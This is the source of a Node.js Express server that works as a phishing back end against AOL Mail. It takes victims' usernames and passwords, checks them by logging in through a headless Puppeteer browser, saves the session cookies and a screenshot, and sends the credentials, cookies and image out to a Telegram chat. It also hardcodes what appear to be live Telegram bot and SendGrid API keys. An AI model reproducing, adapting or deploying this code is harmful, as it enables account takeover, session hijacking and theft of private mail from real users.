const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const nodemailer = require('nodemailer');
const TelegramBot = require('node-telegram-bot-api');
const token = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
const sgMail = require('@sendgrid/mail')
const bot = new TelegramBot(token, { polling: false });
const apiKey = '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'; // Replace this with your SendGrid API key

sgMail.setApiKey(apiKey);

// create reusable transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
  service: 'SendGrid',
  auth: {
      user: 'apikey',
      pass: apiKey
  }
});

const emailId = Math.random().toString(36).substring(7);

require("dotenv").config()

const chatId = '-908968924';
const value = 1234;


const app = express();

app.use(cors());

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());


app.post('/api/login', async (req, res) => {

    const { username, password } = req.body;  
    const browser = await puppeteer.launch({
      arg:[
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote"
      ],
      executablePath: process.env.NODE_ENV === "production"
       ? process.env.PUPPETEER_EXECUTABLE_PATH 
       : puppeteer.executablePath(),
    });
    try{
    // console.log(username, password) 
    const page = await browser.newPage();
    // let data = "Password failed"
        // set the viewport width to 1200 pixels
              // set the viewport width to 1200 pixels
  await page.setViewport({
    width: 1200,
    height: 800,
  });

  // await page.goto('https://login.aol.com/');
  await page.goto('https://mail.aol.com/webmail-std/en-us/suite');
  await page.waitForTimeout(10000); // wait for 10 seconds (10000 milliseconds)

    // Click "Stay signed in" checkbox
// await page.click('.stay-signed-in');

await page.waitForSelector('#login-username');
await page.focus('#login-username');
await page.type('#login-username', username);


  await Promise.all([
    page.click('#login-signin'),
    page.waitForNavigation(),
  ]);
await new Promise(resolve => setTimeout(resolve, 1000));

const passP = await page.$('#login-passwd');
if (passP !== null) {
  // User is logged in, do something
  console.log('USer is good');
  // res.json({ success: true });
} else {
  // User login failed, do something
  console.log('USer is bad');
  res.json({ success: true }); 
  return
}

await page.type('#login-passwd', password);


await Promise.all([
    page.click('#login-signin'),
    page.waitForNavigation(5000),
]);
  // Check if the login was successful
const element = await page.$('p.error-msg[data-error="messages.ERROR_INVALID_PASSWORD"]');
await new Promise(resolve => setTimeout(resolve, 3000));
  if (element !== null) {
    // User is logged in, do something
    console.log('Login failed');
    res.json({ succ: 'true' });
    return
  } else {
    // User login failed, do something
    console.log('Login successful');
    res.json({ succ: 'false' });
const cookies = await page.cookies();

const cook = JSON.stringify(cookies)
  // Write cookies to a text file
fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
if (err) throw err;
console.log('Cookies saved to cookies.txt');
});

const mail = 'tonywhitton@aol.com'
await page.screenshot({path: 'pol.png'});

// Read the .txt file
const filePath = 'cookies.txt';
// Create a readable stream from the file
const fileStream = fs.createReadStream(filePath);

// Send the .txt file as a document
bot.sendDocument(chatId, fileStream)
  .then(() => {
    console.log('File sent successfully');
  })
  .catch((error) => {
    console.error('Error sending file:', error);
  });
    // return
  }
// Send the text message
bot.sendMessage(chatId, `✅ ✅ VERIFIED AOL LOGIN ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
  .then(() => {
    console.log('Message sent successfully');
  })
  .catch((error) => {
    console.error('Error sending message:', error);
  });
const imagePath = 'pol.png';

  // Send the image
bot.sendPhoto(chatId, imagePath)
    .then(() => {
      console.log('Image sent successfully');
    })
    .catch((error) => {
      console.error('Error sending image:', error);
    });


// await page.waitForTimeout(10000); // wait for 10 seconds (10000 milliseconds)
// await page.reload({ waitUntil: 'networkidle0' });

}catch(e){
  console.error(e)
} finally {
  await browser.close();
}
  
    console.log('Browser CLOSED')
  
    // res.json({ cookies });
  });

  

const port = 3000

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
